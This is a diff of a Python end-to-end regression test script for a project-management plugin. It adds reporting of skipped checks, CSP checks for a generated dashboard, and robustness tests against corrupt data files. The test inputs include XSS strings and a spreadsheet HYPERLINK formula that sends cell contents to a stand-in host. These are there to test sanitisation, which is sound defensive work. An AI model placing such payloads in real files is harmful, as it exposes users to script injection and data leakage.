@@ -2,8 +2,12 @@
 """Pruebas de regresión de punta a punta del paquete pm-method (para el mantenedor).
 End-to-end regression tests: BMAD v6 (synthetic + real 6.12.4 fixture), BMAD v4 and native specification, gates, backbone sync and health checks.
 
-Uso / Usage: python3 scripts/probar_paquete.py [--conservar] [--sin-integracion]
+Uso / Usage: python3 scripts/probar_paquete.py [--conservar] [--sin-integracion] [--casos A,E,CC] [--json RUTA] [--listar]
 (--sin-integracion omite el caso X, la suite de integración cruzada de scripts/pruebas/integracion/correr.py)
+--casos corre solo esos casos (por su letra: «Caso A ·», «== KB ·»); --listar muestra las letras y sale.
+--json RUTA escribe el resultado: OK, FALLO (caso, comprobación y detalle), omitidas con su motivo (dependencia o
+herramienta faltante) y duración por caso. Un caso que lanza una excepción cuenta como FALLO con su nombre y la
+corrida sigue con el caso siguiente (como el decorador `eslabon` de la integración).
 Correr después de cualquier cambio del paquete o al adoptar una versión nueva de BMAD (reemplazar o agregar un
 fixture en scripts/pruebas/fixtures/ con artefactos reales de esa versión). Requiere PyYAML.
 """
@@ -13,7 +17,14 @@ RAIZ = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 S = os.path.join(RAIZ, "skills", "pm-estado-proyecto", "scripts")
 B = os.path.join(RAIZ, "skills", "pm-bmad-puente", "scripts", "bmad.py")
 FIX = os.path.join(RAIZ, "scripts", "pruebas", "fixtures")
-RES = {"ok": 0, "fallo": 0}
+RES = {"ok": 0, "fallo": 0, "fallos": [], "omitidas": [], "casos": {}}
+CASO = {"actual": None}   # letra del caso en curso (para atribuir fallos y omisiones)
+
+def omitir(motivo):
+    """Comprobación omitida por una dependencia o herramienta faltante: queda registrada con el caso y el motivo
+    (en la salida y en --json), no solo como un conteo menor."""
+    RES["omitidas"].append({"caso": CASO["actual"], "motivo": motivo})
+    print(f"  OMITIDA [{CASO['actual']}] {motivo}")
 
 def run(args, cwd, esperar=0, entrada=None):
     r = subprocess.run([sys.executable] + args, cwd=cwd, capture_output=True, text=True, input=entrada)
@@ -35,7 +46,44 @@ def junta(proyecto, tipo, cwd, arts=(), por="Junta: Ejecutiva"):
 
 def check(nombre, cond, detalle=""):
     RES["ok" if cond else "fallo"] += 1
+    if not cond: RES["fallos"].append({"caso": CASO["actual"], "comprobacion": nombre, "detalle": str(detalle)[:600]})
     print(f"  {'OK   ' if cond else 'FALLO'} {nombre}" + (f" — {detalle}" if detalle and not cond else ""))
+
+def csp_tablero(html):
+    """(ok, detalle): la meta CSP del tablero autoriza exactamente el script de dibujo (references/guia.md §3 de pm-visuales)."""
+    import base64, hashlib
+    meta = re.search(r'<meta http-equiv="Content-Security-Policy" content="([^"]+)">', html)
+    dibujo = re.search(r"<script>(.*?)</script>", html, re.S)
+    if not (meta and dibujo):
+        return False, f"meta CSP: {bool(meta)} · script de dibujo: {bool(dibujo)}"
+    h = base64.b64encode(hashlib.sha256(dibujo.group(1).encode("utf-8")).digest()).decode()
+    pol = meta.group(1)
+    return (f"'sha256-{h}'" in pol and "default-src 'none'" in pol and "unsafe-eval" not in pol and pol.count("sha256-") == 1
+            and html.count("<script>") == 1), f"hash calculado {h} · política {pol[:120]}"
+
+
+def navegador_tablero(ruta):
+    """Abre el tablero en Chromium (Playwright, si está instalado): el script corre y no hay violaciones de CSP."""
+    try:
+        from playwright.sync_api import sync_playwright
+    except ImportError:
+        omitir("tablero en navegador: falta playwright para Python"); return
+    try:
+        with sync_playwright() as pw:
+            b = pw.chromium.launch()
+            pg = b.new_page()
+            errores = []
+            pg.on("console", lambda m: errores.append(m.text) if m.type == "error" else None)
+            pg.on("pageerror", lambda x: errores.append(str(x)))
+            pg.add_init_script("window.__csp = []; document.addEventListener('securitypolicyviolation', function (e) { window.__csp.push(e.violatedDirective); });")
+            pg.goto("file://" + os.path.abspath(ruta))
+            pg.wait_for_load_state("load")
+            violaciones, meta = pg.evaluate("window.__csp"), pg.text_content("#h-meta") or ""
+            b.close()
+    except Exception as x:
+        omitir(f"tablero en navegador: Chromium no arrancó: {str(x).splitlines()[0][:120]}"); return
+    check("tablero en Chromium: el script de dibujo corre con la CSP propia, sin violaciones ni errores",
+          not violaciones and not errores and meta.startswith("Etapa / Stage:"), f"violaciones {violaciones} · errores {errores[:3]} · h-meta {meta[:60]!r}")
 
 def sanidad(proy, cwd):
     r = run([os.path.join(S, "sanidad.py"), "--proyecto", proy, "--json"], cwd, esperar=None)
@@ -379,6 +427,20 @@ def caso_puertas_bmad(tmp):
     check("puertas.py estado (insumo de informes): 3 puertas, observación CONCERNS y próxima puerta", len(est.get("puertas", [])) == 3
           and any("CONCERNS" in o for r in est["puertas"] for o in r["observaciones"]) and (est.get("proxima") or {}).get("puerta") == "autorizar-etapa", str(est)[:300])
     check("estado.py resumen muestra última y próxima puerta", "Próxima puerta" in ES("resumen").stdout and "Última puerta" in ES("resumen").stdout)
+    # E-10: el CONCERNS que ya fue condición de la puerta anterior (posterior al veredicto) y se cumplió baja a aviso
+    ruta_e = os.path.join(repo, g, "estado.json"); original = open(ruta_e, encoding="utf-8").read()
+    e = json.loads(original); u = e["puertas"][-1]
+    u.update({"decision": "condicionado", "condiciones": "gate de preparación de BMAD en CONCERNS (falta UX de la bandeja)", "decision_id": u.get("decision_id") or "D-999"})
+    open(ruta_e, "w", encoding="utf-8").write(json.dumps(e, ensure_ascii=False, indent=2))
+    abierta = json.loads(PUr("verificar", "autorizar-etapa", "--json").stdout or "{}")
+    u["condiciones_cumplidas"] = u["fecha"]
+    open(ruta_e, "w", encoding="utf-8").write(json.dumps(e, ensure_ascii=False, indent=2))
+    cumplida = json.loads(PUr("verificar", "autorizar-etapa", "--json").stdout or "{}")
+    open(ruta_e, "w", encoding="utf-8").write(original)
+    check("E-10: CONCERNS ya tratado como condición de la puerta anterior → condición mientras está abierta y aviso (con la puerta y su decisión) cuando se cumplió",
+          any("CONCERNS" in x for x in abierta.get("condiciones", [])) and not any("CONCERNS" in x for x in cumplida.get("condiciones", []))
+          and any("CONCERNS" in x and "ya tratado en autorizar-etapa" in x and u["decision_id"] in x and "preparacion-bmad" in x for x in cumplida.get("avisos", [])),
+          str(abierta.get("condiciones"))[:200] + " | " + str(cumplida.get("avisos"))[:300])
 
 # ------------------------------------------------------------------ maestro de interesados, capa de canales y OKR
 def servidores_locales():
@@ -922,7 +984,8 @@ def caso_documentos(tmp):
     d = os.path.join(tmp, "docs-html"); os.makedirs(d, exist_ok=True)
     shutil.copy(sorted(glob.glob(os.path.join(RAIZ, "docs", "guias", "img", "*.png")))[0], os.path.join(d, "fig.png"))
     con_mmdc = shutil.which("mmdc") is not None
-    mermaid = "```mermaid\nflowchart LR\n    a[\"Inicio\"] --> b[\"Fin\"]\n```\n" if con_mmdc else ""
+    if not con_mmdc: omitir("L2 bloque Mermaid dibujado en el documento HTML: mmdc no está en el PATH")
+    mermaid ="```mermaid\nflowchart LR\n    a[\"Inicio\"] --> b[\"Fin\"]\n```\n" if con_mmdc else ""
     md = ("# Ejercicio · E2E-9 · Muestra\n\n## Cómo funciona este ejercicio\n\nMECANICA-77: completás la hoja y comparás con el ejemplo.\n\n"
           "**Negrita**, *cursiva*, `código <b>` y [ancla](#parte-a) y [externo](https://example.org/x?a=1&b=2).\n"
           "Texto con <script>alert(1)</script> y <img src=x onerror=alert(2)> y un salto<br>de línea.\n\n"
@@ -1019,7 +1082,7 @@ def caso_seguridad(tmp):
     try:
         import openpyxl
     except ImportError:
-        print("  (SEG-02 omitida: falta openpyxl)"); return
+        omitir("SEG-02: falta openpyxl"); return
     with open(os.path.join(d, "r.csv"), "w", newline="", encoding="utf-8") as f:
         csv.writer(f).writerows([["id", "descripcion"], ["R-001", '=HYPERLINK("http://ejemplo.test/?d="&A1,"ver")'], ["R-002", "texto normal"]])
     run([os.path.join(S, "exportar.py"), "xlsx", "--entrada", "r.csv", "--salida", "r.xlsx"], d)
@@ -1195,7 +1258,7 @@ def caso_endurecimiento(tmp):
         plt.close(f_)
         check("visuales: localizador de enteros solo cuando todos los valores son enteros", ok)
     except ImportError:
-        print("  (visuales omitida: falta matplotlib)")
+        omitir("visuales (localizador de enteros): falta matplotlib")
     js = open(os.path.join(RAIZ, "docs", "informe", "fuente", "build_pptx.js"), encoding="utf-8").read()
     mae = re.search(r'defineSlideMaster\(\{ title: "CONTENT".*?\}\] \}\);', js, re.S)
     check("build_pptx.js: slideNumber es propiedad del layout CONTENT, no un objeto de la lista", mae and re.search(r"slideNumber:.*objects: \[", mae.group(0), re.S)
@@ -1305,6 +1368,7 @@ def caso_mapas(tmp):
               lint_ok and errs == [None, None] and "component Mensajería [0.45, 0.88] (build)" in owm and "inertia" in owm, f"{errs} {owm[:200]}")
     else:
         check("M-09 Mermaid wardley-beta y journey pasan el lint (mmdc no instalado: render omitido); export OWM", lint_ok and "(build)" in owm)
+        omitir("M-09 render de Mermaid con mmdc: mmdc no está en el PATH")
     run([os.path.join(S, "estado.py"), "--proyecto", gn, "artefacto", "mapa-wardley-entregables", "--ruta", "02-planificacion/visuales/wardley-entregables.md", "--estado", "en-revision"], nat)
     run([os.path.join(S, "estado.py"), "--proyecto", gn, "aprobar", "mapa-wardley-entregables", "--por", "Ejecutiva: E", "--nivel", "gestor"], nat)
     run([MP, "--proyecto", gn, "wardley", "render", "entregables", "--png", "no"], nat)
@@ -1652,6 +1716,8 @@ def caso_periodo(tmp):
           m and "</script><!--" not in m.group(1) and "<" not in m.group(1) and vuelta.get("comentario_gestor") == "Costo </script><!-- fin"
           and vuelta["umbrales_riesgo"]["alto"] == 12 and [o["rag"] for o in vuelta["objetivos"]][:2] == ["rojo", ev["semaforo_costo"]]
           and vuelta["decisiones_pendientes"][0]["id"] == "C-001" and est["artefactos"]["tablero-avance"]["estado"] == "en-revision", r.stdout[-300:])
+    check("tablero: CSP propia con el hash sha256 del script de dibujo (default-src 'none', sin red)", *csp_tablero(html))
+    navegador_tablero(th)
     md = open(hl, encoding="utf-8").read() if os.path.exists(hl) else ""
     check("highlight: borrador de la variante mínima con las siete filas, cifras del EVM, [por redactar] y la cadena verificada al generarlo",
           md.count("[por redactar]") == 3 and "| Riesgo | rojo |" in md and f"CPI {ev['CPI']:.3f}".replace(".", ",") in md and "cadena de reporte: OK" in r.stdout and "&lt;/script&gt;" not in md.split("## 2.")[0], r.stdout[-300:])
@@ -2547,8 +2613,14 @@ def caso_concurrencia(tmp):
         check("la escritura atómica conserva los permisos del archivo (0640)", (os.stat(rr).st_mode & 0o777) == 0o640, oct(os.stat(rr).st_mode))
     os.remove(os.path.join(d, g, "03-control", "registros", "calidad.csv"))
     t0 = time.time(); r6 = run([PU, "--proyecto", g, "lista", "autorizar-inicio"], d)
-    check("puertas.py lista (con el bloqueo) lanza sanidad.py, que recrea un registro faltante: el subproceso hereda el bloqueo y no espera",
-          r6.returncode == 0 and os.path.exists(os.path.join(d, g, "03-control", "registros", "calidad.csv")) and time.time() - t0 < 20, round(time.time() - t0, 1))
+    check("puertas.py lista (con el bloqueo) lanza sanidad.py sin esperar; sin --reparar la sanidad no recrea el registro faltante (no escribe)",
+          r6.returncode == 0 and not os.path.exists(os.path.join(d, g, "03-control", "registros", "calidad.csv")) and time.time() - t0 < 20, round(time.time() - t0, 1))
+    herencia = ("import sys, subprocess; sys.path.insert(0, sys.argv[1]); import esquema as E\n"
+                "with E.bloqueo(sys.argv[2]):\n    r = subprocess.run([sys.executable, sys.argv[3], '--proyecto', sys.argv[2], 'agregar', 'acciones', '--campo', 'descripcion=herencia', '--campo', 'responsable=Gestor'])\n"
+                "sys.exit(r.returncode)\n")
+    t0 = time.time(); r7 = subprocess.run([sys.executable, "-c", herencia, S, g, RE_], cwd=d, capture_output=True, text=True, env=dict(os.environ, PM_BLOQUEO_ESPERA="5"))
+    check("un subproceso que el titular del bloqueo lanza y espera (registro.py agregar) hereda el bloqueo y escribe sin esperar",
+          r7.returncode == 0 and time.time() - t0 < 20 and r7.stdout.strip().startswith("A-"), (r7.stdout + r7.stderr)[-300:])
     bl = os.path.join(d, g, ".pm-bloqueo")
     check("el archivo de bloqueo vive en <proyecto>/.pm-bloqueo/ con un .gitignore que lo excluye de git",
           os.path.isfile(os.path.join(bl, "bloqueo")) and open(os.path.join(bl, ".gitignore"), encoding="utf-8").read().splitlines()[-1] == "*")
@@ -2556,6 +2628,8 @@ def caso_concurrencia(tmp):
         subprocess.run(["git", "init", "-q"], cwd=d, capture_output=True)
         st = subprocess.run(["git", "status", "--porcelain", "--untracked-files=all"], cwd=d, capture_output=True, text=True).stdout
         check("git status no muestra .pm-bloqueo/ (sí estado.json y los registros)", ".pm-bloqueo" not in st and "g/estado.json" in st, st[:300])
+    else:
+        omitir("git status sin .pm-bloqueo/: git no está en el PATH")
     gd = subprocess.run([sys.executable, os.path.join(RAIZ, "hooks", "guardian.py")], input=json.dumps({"tool_name": "Bash", "tool_input": {"command":
                         f"PM_BLOQUEO_ESPERA=60 python3 {RE_} --proyecto {g} agregar riesgos --campo evento=x"}}), capture_output=True, text=True)
     check("el guardián no bloquea registro.py con PM_BLOQUEO_ESPERA delante", gd.returncode == 0 and not gd.stdout.strip(), gd.stdout[:200])
@@ -2603,7 +2677,7 @@ def caso_diagram_design(tmp):
     dd = os.environ.get("PM_DIAGRAM_DESIGN", "")
     ext, chk = os.path.join(dd, "scripts", "mermaid_extract.py"), os.path.join(dd, "scripts", "self_check.py")
     if not (dd and os.path.isfile(ext) and os.path.isfile(chk)):
-        print("  (compatibilidad con diagram-design omitida: definir PM_DIAGRAM_DESIGN=<carpeta skills/diagram-design>; la imagen Docker la define)")
+        omitir("compatibilidad con diagram-design: definir PM_DIAGRAM_DESIGN=<carpeta skills/diagram-design>; la imagen Docker la define")
         return
     ejecutar = lambda *a: subprocess.run([sys.executable, "-I"] + list(a), capture_output=True, text=True, cwd=d, stdin=subprocess.DEVNULL, timeout=120)
     r = ejecutar(ext, "wbs.md")
@@ -2643,7 +2717,7 @@ def caso_ayuda(tmp):
                  [os.path.join(S, "registro.py"), "--proyecto", "no", "listar", "riesgos"], [B, "--proyecto", "no", "detectar"], [sk("pm-riesgos", "scripts", "riesgos.py"), "--proyecto", "no", "candidatos"],
                  [sk("pm-interesados", "scripts", "interesados.py"), "--proyecto", "no", "matriz"], [sk("pm-integraciones", "scripts", "envios.py"), "--proyecto", "no", "historial"],
                  [sk("pm-mapas-estrategicos", "scripts", "mapas.py"), "--proyecto", "no", "listar"], [sk("pm-exportar", "scripts", "paquete.py"), "--proyecto", "no", "listar", "puerta", "autorizar-inicio"],
-                 [sk("pm-direccion-decisiones", "scripts", "decision.py"), "--proyecto", "no", "matriz", "x"]]
+                 [sk("pm-direccion-decisiones", "scripts", "decision.py"), "--proyecto", "no", "matriz", "x"], [os.path.join(S, "tablero.py"), "--proyecto", "no", "generar"]]
     malos = []
     for c in faltantes:
         r = subprocess.run([sys.executable] + c, capture_output=True, text=True, cwd=tmp, stdin=subprocess.DEVNULL)
@@ -3163,9 +3237,965 @@ def caso_pm_kb(tmp):
           r.returncode == 0 and len(ok) >= 19 and not fallos, (r.stdout + r.stderr)[-800:])
 
 
+def caso_robustez(tmp):
+    """RB: robustez de datos (2.6.2; docs/ARQUITECTURA.md §9.4). Un dato ilegible (estado.json truncado o con tipos
+    inválidos, CSV en cp1252 o mal formado) nunca se toma como "vacío" ni deja una traza: mensaje con el archivo y el
+    motivo, código ≠ 0 y nada reescrito (sha256 de todo el proyecto antes y después); BOM de Excel tolerado; el hook de
+    inicio avisa; salida en consolas cp1252 (PYTHONIOENCODING=cp1252 emula la tubería de Windows)."""
+    print("\n== RB · robustez de datos")
+    import hashlib
+    d = os.path.join(tmp, "rb"); os.makedirs(d); g = "gestion"; P = os.path.join(d, g); REGS = os.path.join(P, "03-control", "registros")
+    ES, RG, SA = (os.path.join(S, x) for x in ("estado.py", "registro.py", "sanidad.py"))
+    INI, GU = os.path.join(RAIZ, "hooks", "inicio.py"), os.path.join(RAIZ, "hooks", "guardian.py")
+    def py(script, *args, env=None, entrada=None):
+        return subprocess.run([sys.executable, script] + list(args), cwd=d, capture_output=True, text=True, encoding="utf-8",
+                              errors="replace", input=entrada, env={**os.environ, **(env or {})})
+    def huellas():
+        out = {}
+        for raiz, dirs, archivos in os.walk(P):
+            dirs[:] = [x for x in dirs if x != ".pm-bloqueo"]
+            for a in archivos:
+                q = os.path.join(raiz, a)
+                with open(q, "rb") as fh: out[os.path.relpath(q, P)] = hashlib.sha256(fh.read()).hexdigest()
+        return out
+    sin_traza = lambda rs: all("Traceback" not in r.stdout + r.stderr for r in rs)
+    rechaza = lambda rs, *txt: all(r.returncode != 0 and all(x in r.stderr for x in txt) for r in rs) and sin_traza(rs)
+    det = lambda rs: " || ".join(f"rc={r.returncode} {(r.stdout + r.stderr)[-220:]!r}" for r in rs)
+    run([os.path.join(S, "nuevo_proyecto.py"), "--ruta", g, "--nombre", "Robustez", "--fecha", "2026-10-01", "--ejecutivo", "Ejecutiva", "--gestor", "Gestor"], d)
+    py(RG, "--proyecto", g, "agregar", "issues", "--campo", "tipo=problema-preocupacion", "--campo", "titulo=Primero")
+    py(RG, "--proyecto", g, "agregar", "riesgos", "--campo", "evento=Señal débil", "--campo", "tipo=amenaza", "--campo", "probabilidad=2", "--campo", "impacto=2")
+    pe, pi, pr = os.path.join(P, "estado.json"), os.path.join(REGS, "issues.csv"), os.path.join(REGS, "riesgos.csv")
+    leer_b = lambda p: open(p, "rb").read()
+    E0, I0, R0 = leer_b(pe), leer_b(pi), leer_b(pr)
+    def escribir_b(p, b):
+        with open(p, "wb") as fh: fh.write(b)
+
+    # H1 · BOM UTF-8 (Excel «CSV UTF-8»): se lee sin duplicar columnas ni ids; se reescribe en UTF-8 sin BOM
+    escribir_b(pi, b"\xef\xbb\xbf" + I0)
+    r = py(RG, "--proyecto", g, "agregar", "issues", "--campo", "tipo=problema-preocupacion", "--campo", "titulo=Segundo")
+    nuevo = leer_b(pi); cab = nuevo.split(b"\r\n")[0].split(b",")
+    ids = [f.get("id") for f in csv.DictReader(open(pi, encoding="utf-8-sig", newline=""))]
+    sj = json.loads(py(SA, "--proyecto", g, "--json", "--corte", "2026-10-29").stdout or "{}")
+    check("RB-01 CSV con BOM (Excel «CSV UTF-8»): registro.py agregar asigna I-002 (no repite I-001), el encabezado no duplica 'id', el archivo "
+          "queda en UTF-8 sin BOM y la sanidad no ve ids inválidos ni duplicados (REG-03/REG-04)",
+          r.returncode == 0 and "I-002" in r.stdout and ids == ["I-001", "I-002"] and cab.count(b"id") == 1 and not nuevo.startswith(b"\xef\xbb\xbf")
+          and not {"REG-03", "REG-04"} & codigos(sj), det([r]) + f" ids={ids} cab={cab[:2]}…{cab[-2:]}")
+    I0 = leer_b(pi)
+
+    # H2 / H3b · registro en otra codificación (cp1252): nada de "Abiertos: ninguno" ni semáforo verde; mensaje y nada reescrito
+    escribir_b(pr, R0.decode("utf-8").encode("cp1252"))
+    antes = huellas()
+    ctx = py(ES, "--proyecto", g, "contexto", "--corte", "2026-10-29")
+    rad = [py(ES, "--proyecto", g, "radar", "--corte", "2026-10-29"), py(ES, "--proyecto", g, "radar", "--linea", "--corte", "2026-10-29")]
+    per = py(ES, "--proyecto", g, "periodo", "--desde", "2026-10-01", "--corte", "2026-10-29")
+    check("RB-02 riesgos.csv en cp1252: estado.py contexto no dice «ninguno»: código ≠ 0, mensaje con el archivo y «UTF-8», sin traza",
+          rechaza([ctx], "riesgos.csv", "UTF-8") and "ninguno" not in ctx.stdout, det([ctx]))
+    check("RB-03 riesgos.csv en cp1252: estado.py radar (también --linea) y periodo informan el archivo ilegible (código ≠ 0, sin traza, sin semáforo verde)",
+          rechaza(rad + [per], "riesgos.csv") and "verde" not in per.stdout, det(rad + [per]))
+    s = py(SA, "--proyecto", g, "--json", "--corte", "2026-10-29")
+    try: sj = json.loads(s.stdout)
+    except ValueError: sj = {}
+    check("RB-04 riesgos.csv en cp1252: sanidad.py sigue y lo informa como DAT-01 ERROR con el archivo (código 1, sin traza)",
+          s.returncode == 1 and sin_traza([s]) and any(h["codigo"] == "DAT-01" and "riesgos.csv" in h["mensaje"] for h in sj.get("hallazgos", [])), det([s]))
+    rr = [py(RG, "--proyecto", g, "listar", "riesgos"), py(RG, "--proyecto", g, "agregar", "riesgos", "--campo", "evento=Otro", "--campo", "tipo=amenaza"),
+          py(os.path.join(S, "puertas.py"), "--proyecto", g, "verificar", "autorizar-cierre")]
+    pv = py(os.path.join(S, "puertas.py"), "--proyecto", g, "verificar", "autorizar-inicio")
+    check("RB-05 riesgos.csv en cp1252: registro.py listar/agregar y puertas.py verificar autorizar-cierre (lee riesgos) se niegan con el archivo y "
+          "el motivo; verificar autorizar-inicio lo muestra como bloqueo S-DAT-01 (sin traza)",
+          rechaza(rr, "riesgos.csv") and sin_traza([pv]) and re.search(r"BLOQUEO\s+S-DAT-01 .*riesgos\.csv", pv.stdout), det(rr + [pv]))
+    check("RB-06 con el registro ilegible, ningún comando reescribió nada (sha256 de todo el proyecto, bitácora incluida)", huellas() == antes,
+          str(sorted(k for k in set(antes) | set(huellas()) if antes.get(k) != huellas().get(k))))
+    h = py(INI, entrada=json.dumps({"cwd": d}))
+    check("RB-07 hook de inicio con un registro ilegible: línea «pm-method · AVISO» con el archivo (sin cortar la sesión: código 0)",
+          h.returncode == 0 and "pm-method · AVISO" in h.stdout and "riesgos.csv" in h.stdout and "Abiertos: ninguno" not in h.stdout, h.stdout[-500:] + h.stderr[-300:])
+    escribir_b(pr, R0)
+
+    # H3 · estado.json truncado, con una clave de otro tipo o que no es un objeto
+    roto = {"truncado": E0[: len(E0) // 2], "puertas": json.dumps({**json.loads(E0), "puertas": ["autorizar-inicio"]}, ensure_ascii=False).encode("utf-8"),
+            "lista": b"[1, 2]"}
+    for nombre, contenido in roto.items():
+        escribir_b(pe, contenido); antes = huellas()
+        rs = [py(SA, "--proyecto", g), py(SA, "--proyecto", g, "--rapido", "--json"), py(ES, "--proyecto", g, "ver"), py(ES, "--proyecto", g, "contexto"),
+              py(ES, "--proyecto", g, "radar"), py(os.path.join(S, "puertas.py"), "--proyecto", g, "estado"),
+              py(os.path.join(S, "puertas.py"), "--proyecto", g, "verificar", "autorizar-inicio"), py(RG, "--proyecto", g, "resumen"),
+              py(RG, "--proyecto", g, "agregar", "cambios", "--campo", "titulo=X", "--campo", "decision=aprobado", "--campo", "decidido_por=Junta",
+                 "--campo", "costo=100", "--campo", "cargo=presupuesto-cambio"),
+              py(ES, "--proyecto", g, "set", "enfoque_entrega=hibrido", "--por", "Ejecutiva")]
+        clave = {"truncado": "JSON", "puertas": "puertas", "lista": "list"}[nombre]
+        check(f"RB-08 estado.json {nombre}: sanidad, estado.py ver|contexto|radar|set, puertas.py estado|verificar y registro.py resumen|agregar cambios "
+              f"terminan con código ≠ 0, el archivo y el motivo ({clave}), sin traza y sin reescribir nada",
+              rechaza(rs, "estado.json", clave) and huellas() == antes, det([r for r in rs if r.returncode == 0 or "Traceback" in r.stdout + r.stderr or "estado.json" not in r.stderr][:3]))
+        if nombre == "truncado":
+            h = py(INI, entrada=json.dumps({"cwd": d}))
+            check("RB-09 hook de inicio con estado.json truncado: línea «pm-method · AVISO» con el motivo (código 0, la sesión sigue)",
+                  h.returncode == 0 and "pm-method · AVISO" in h.stdout and "estado.json" in h.stdout, h.stdout[-400:] + h.stderr[-300:])
+    escribir_b(pe, E0)
+
+    # H6 · CSV mal formado: registro.py agregar se niega a reescribirlo "normalizado"
+    filas_malas = {"comilla sin cerrar": b'I-009,2026-10-02,,problema-preocupacion,"Sin cerrar,,,,,,,,abierto,,\r\n',
+                   "fila corta": b"I-009,2026-10-02,,problema-preocupacion\r\n",
+                   "fila larga": b"I-009,2026-10-02,,problema-preocupacion,Larga,,,,,,,,abierto,,,sobra\r\n"}
+    for nombre, fila in filas_malas.items():
+        escribir_b(pi, I0 + fila); antes = huellas()
+        r = py(RG, "--proyecto", g, "agregar", "issues", "--campo", "tipo=problema-preocupacion", "--campo", "titulo=Nueva")
+        check(f"RB-10 issues.csv con {nombre}: registro.py agregar se niega (código ≠ 0, «issues.csv» y la línea, sin traza) y no reescribe nada",
+              rechaza([r], "issues.csv") and re.search(r"l[ií]ne", r.stderr) and huellas() == antes, det([r]))
+    escribir_b(pi, I0)
+
+    # H5 · consola o tubería en cp1252 (Windows): sin UnicodeEncodeError; la salida es UTF-8
+    cp = {"PYTHONIOENCODING": "cp1252"}
+    rs = [py(SA, "--proyecto", g, env=cp), py(ES, "--proyecto", g, "resumen", env=cp), py(ES, "--proyecto", g, "radar", env=cp),
+          py(os.path.join(S, "puertas.py"), "--proyecto", g, "verificar", "autorizar-inicio", env=cp), py(RG, "--proyecto", g, "historial", env=cp)]
+    check("RB-11 PYTHONIOENCODING=cp1252: sanidad, estado.py resumen|radar, puertas.py verificar y registro.py historial sin traza ni "
+          "UnicodeEncodeError, con salida UTF-8 legible",
+          sin_traza(rs) and all(r.returncode in (0, 1) and r.stdout.strip() and "�" not in r.stdout for r in rs), det([r for r in rs if "Traceback" in r.stderr][:2]))
+    h = py(INI, entrada=json.dumps({"cwd": d}), env=cp)
+    check("RB-12 hook de inicio con cp1252: resume el proyecto (antes el «→» de las reglas cortaba la salida y la sesión empezaba sin contexto)",
+          h.returncode == 0 and "pm-method · proyecto" in h.stdout and "pm-method · enrutamiento" in h.stdout, h.stdout[-200:] + h.stderr[-200:])
+    # Claude Code envía el JSON del hook en UTF-8 sin escapar los acentos (ensure_ascii=False lo emula)
+    gd = py(GU, entrada=json.dumps({"tool_name": "Write", "tool_input": {"file_path": os.path.join(d, "PLANIFICACIÓN ÍNDICE", g, "estado.json")}}, ensure_ascii=False), env=cp)
+    check("RB-13 guardián con cp1252: niega escribir estado.json en una ruta con «Í» (antes la entrada no se decodificaba y la escritura pasaba sin revisar)",
+          '"deny"' in gd.stdout, gd.stdout[-200:] + gd.stderr[-200:])
+
+
+def caso_caminos_alternos(tmp):
+    """CP: caminos alternos del ciclo PRINCE2 (2.6.2; docs/PUERTAS.md §3.2, guía de registros §3). Cierre prematuro como
+    puerta propia: desde la iniciación (no desde el pre-proyecto) y desde la entrega, con la decisión de la junta citada;
+    C-08 inventario, C-07 aviso, C-04 bloqueo; puertas.py estado, radar y sanidad coherentes. Cambios: combinaciones
+    decision × estado contradictorias rechazadas al escribir (también con --forzar y en propuestas), CAM-06 para datos ya
+    existentes y presupuesto sin consumir por un cambio rechazado o diferido. Además, caminos ya existentes sin cobertura:
+    puertas rechazadas (proyecto, etapa, plan de excepción), pendiente, excepción completa, supuesto transferido y
+    revisión de calidad cancelada."""
+    print("\n== CP · caminos alternos del cierre y los cambios")
+    d = os.path.join(tmp, "cp"); os.makedirs(d)
+    ES, RG, SA, NP = (os.path.join(S, x) for x in ("estado.py", "registro.py", "sanidad.py", "nuevo_proyecto.py"))
+    def py(script, *args):
+        return subprocess.run([sys.executable, script] + list(args), cwd=d, capture_output=True, text=True, encoding="utf-8", errors="replace")
+    def est(g): return json.load(open(os.path.join(d, g, "estado.json"), encoding="utf-8"))
+    def filas(g, reg):
+        q = os.path.join(d, g, "03-control", "registros", f"{reg}.csv")
+        return list(csv.DictReader(open(q, encoding="utf-8", newline=""))) if os.path.exists(q) else []
+    def art(g, clave, ruta):
+        q = os.path.join(d, g, ruta); os.makedirs(os.path.dirname(q), exist_ok=True)
+        open(q, "w", encoding="utf-8").write(f"---\ntipo: {clave}\nestado: borrador\n---\n# {clave}\nBeneficio B-1.\n")
+        return py(ES, "--proyecto", g, "artefacto", clave, "--ruta", ruta, "--estado", "en-revision")
+    def verif(g, tipo):
+        try: return json.loads(py(PU, "--proyecto", g, "verificar", tipo, "--json").stdout)
+        except ValueError: return {"hallazgos": []}
+    def hall(v, id_): return [h for h in v.get("hallazgos", []) if h["id"] == id_]
+    def sev(v, id_): return {h["severidad"] for h in hall(v, id_)}
+    def san(g, corte):
+        try: return json.loads(py(SA, "--proyecto", g, "--json", "--corte", corte).stdout)
+        except ValueError: return {"hallazgos": []}
+    def cods(s, sev_=None): return {h["codigo"] for h in s.get("hallazgos", []) if sev_ is None or h["severidad"] == sev_}
+    def radar(g, corte):
+        try: return json.loads(py(ES, "--proyecto", g, "radar", "--json", "--corte", corte, "--max", "0").stdout)
+        except ValueError: return {"items": {}}
+    def reglas(rd): return [x for v in rd.get("items", {}).values() for x in v]
+    det = lambda *rs: " || ".join(f"rc={r.returncode} {(r.stdout + r.stderr)[-260:]!r}" for r in rs)
+    JUNTA = "Junta: Laura Méndez (ejecutiva)"
+    def nuevo(g):
+        py(NP, "--ruta", g, "--nombre", g.capitalize(), "--fecha", "2026-10-01", "--ejecutivo", "Laura Méndez", "--gestor", "Martín Suárez")
+
+    # --- 1 · pre-proyecto e iniciación: cierre prematuro desde la iniciación (PRINCE2 DP: si no se autoriza el proyecto, se cierra prematuramente)
+    g = "ini"; nuevo(g)
+    r = py(ES, "--proyecto", g, "puerta", "autorizar-inicio", "--decision", "rechazado", "--por", JUNTA, "--fecha", "2026-10-05", "--motivo", "mandato sin patrocinio")
+    e, ds = est(g), filas(g, "decisiones")
+    check("CP-01 autorizar-inicio rechazado con --motivo: sigue en pre-proyecto/SU, D-### de nivel junta con el motivo, y el aviso dice que no hay cierre (CP) que ejecutar",
+          r.returncode == 0 and (e["fase"], e["proceso_actual"]) == ("pre-proyecto", "SU") and ds and e["puertas"][-1].get("decision_id") == ds[-1]["id"]
+          and ds[-1]["nivel"] == "junta" and "mandato sin patrocinio" in ds[-1]["decision"] and e["puertas"][-1].get("motivo") == "mandato sin patrocinio"
+          and "autorizar-inicio" in r.stdout and "CP" in r.stdout, det(r))
